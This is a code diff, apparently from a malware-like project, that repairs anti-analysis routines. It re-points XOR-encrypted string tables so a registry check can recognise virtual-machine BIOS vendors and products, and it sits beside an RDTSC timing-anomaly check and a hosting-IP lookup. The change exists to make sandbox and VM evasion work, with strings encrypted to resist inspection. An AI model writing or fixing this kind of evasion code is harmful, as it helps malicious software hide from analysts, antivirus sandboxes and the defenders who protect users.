@@ -16,27 +16,29 @@
 #include "enc_strings.h"
 #include <string.h>
 
-/* ── Encrypted strings: moved to include/enc_strings.h (Phase 4) ── */
+/* ── Encrypted strings (enc_strings.h — properly XOR-encrypted with
+ * MIRAGE_STRING_KEY_ENC; the previous local copies were PLAINTEXT
+ * byte arrays, so decrypt_into produced garbage and the VM registry
+ * check never matched) ───────────────────────────────────── */
 
-static const uint8_t* vm_manuf_tbl[6] = {
+/* VM manufacturer / product string tables */
+static const uint8_t *const vm_manuf_tab[6] = {
     enc_vm_manuf_0, enc_vm_manuf_1, enc_vm_manuf_2,
-    enc_vm_manuf_3, enc_vm_manuf_4, enc_vm_manuf_5,
+    enc_vm_manuf_3, enc_vm_manuf_4, enc_vm_manuf_5
 };
 static const size_t vm_manuf_len[6] = {
     ENC_VM_MANUF_0_LEN, ENC_VM_MANUF_1_LEN, ENC_VM_MANUF_2_LEN,
-    ENC_VM_MANUF_3_LEN, ENC_VM_MANUF_4_LEN, ENC_VM_MANUF_5_LEN,
+    ENC_VM_MANUF_3_LEN, ENC_VM_MANUF_4_LEN, ENC_VM_MANUF_5_LEN
 };
-#define VM_MANUF_COUNT 6
 
-static const uint8_t* vm_prod_tbl[6] = {
+static const uint8_t *const vm_prod_tab[6] = {
     enc_vm_prod_0, enc_vm_prod_1, enc_vm_prod_2,
-    enc_vm_prod_3, enc_vm_prod_4, enc_vm_prod_5,
+    enc_vm_prod_3, enc_vm_prod_4, enc_vm_prod_5
 };
 static const size_t vm_prod_len[6] = {
     ENC_VM_PROD_0_LEN, ENC_VM_PROD_1_LEN, ENC_VM_PROD_2_LEN,
-    ENC_VM_PROD_3_LEN, ENC_VM_PROD_4_LEN, ENC_VM_PROD_5_LEN,
+    ENC_VM_PROD_3_LEN, ENC_VM_PROD_4_LEN, ENC_VM_PROD_5_LEN
 };
-#define VM_PROD_COUNT 6
 
 /* ── Helper: RDTSC ───────────────────────────────────────── */
 
@@ -149,7 +151,7 @@ static int contains_one_of(HANDLE key, const char* value_name,
 
 int mirage_check_registry_vm_indicators(void) {
     uint8_t path_tmp[ENC_REG_BIOS_PATH_LEN];
-    mirage_xor_decrypt(enc_reg_bios_path, path_tmp, ENC_REG_BIOS_PATH_LEN);
+    decrypt_into(enc_reg_bios_path, ENC_REG_BIOS_PATH_LEN, path_tmp);
 
     WCHAR buf_us[512];
     UNICODE_STRING us;
@@ -166,30 +168,31 @@ int mirage_check_registry_vm_indicators(void) {
     if (open_status < 0) return 0;
 
     /* Decrypt manufacturer strings */
-    uint8_t manuf_bufs[VM_MANUF_COUNT][16];
-    const uint8_t* manuf_ptrs[VM_MANUF_COUNT];
-    for (size_t i = 0; i < VM_MANUF_COUNT; i++) {
-        decrypt_into(vm_manuf_tbl[i], vm_manuf_len[i], manuf_bufs[i]);
+    uint8_t manuf_bufs[6][16];
+    const uint8_t* manuf_ptrs[6];
+    for (size_t i = 0; i < 6; i++) {
+        decrypt_into(vm_manuf_tab[i], vm_manuf_len[i], manuf_bufs[i]);
         manuf_ptrs[i] = manuf_bufs[i];
     }
 
     /* Decrypt product strings */
-    uint8_t prod_bufs[VM_PROD_COUNT][16];
-    const uint8_t* prod_ptrs[VM_PROD_COUNT];
-    for (size_t i = 0; i < VM_PROD_COUNT; i++) {
-        decrypt_into(vm_prod_tbl[i], vm_prod_len[i], prod_bufs[i]);
+    uint8_t prod_bufs[6][16];
+    const uint8_t* prod_ptrs[6];
+    for (size_t i = 0; i < 6; i++) {
+        decrypt_into(vm_prod_tab[i], vm_prod_len[i], prod_bufs[i]);
         prod_ptrs[i] = prod_bufs[i];
     }
 
     /* Decrypt value names */
     uint8_t manuf_name[ENC_SYS_MANUFACTURER_LEN];
     uint8_t prod_name[ENC_SYS_PRODUCT_NAME_LEN];
-    mirage_xor_decrypt(enc_sys_manufacturer, manuf_name, ENC_SYS_MANUFACTURER_LEN);
-    mirage_xor_decrypt(enc_sys_product_name, prod_name, ENC_SYS_PRODUCT_NAME_LEN);
+    decrypt_into(enc_sys_manufacturer, ENC_SYS_MANUFACTURER_LEN, manuf_name);
+    decrypt_into(enc_sys_product_name, ENC_SYS_PRODUCT_NAME_LEN, prod_name);
+
     int found = contains_one_of(key_handle, (const char*)manuf_name,
-                                manuf_ptrs, vm_manuf_len, VM_MANUF_COUNT)
+                                manuf_ptrs, vm_manuf_len, 6)
              || contains_one_of(key_handle, (const char*)prod_name,
-                                prod_ptrs, vm_prod_len, VM_PROD_COUNT);
+                                prod_ptrs, vm_prod_len, 6);
 
     mirage_NtClose(key_handle);
     return found;
@@ -217,7 +220,9 @@ int mirage_check_timing_anomaly(void) {
     return (t1 - t0) < VM_TIMING_ANOMALY_TSC ? 1 : 0;
 }
 
-/* Hosting IP check strings: moved to include/enc_strings.h (Phase 4) */
+/* ── XOR-encrypted strings for hosting IP check ──────────── */
+
+/* ip-api strings + hosting marker: enc_strings.h (restored arrays) */
 
 /* ── checkHostingIP ──────────────────────────────────────── */
 
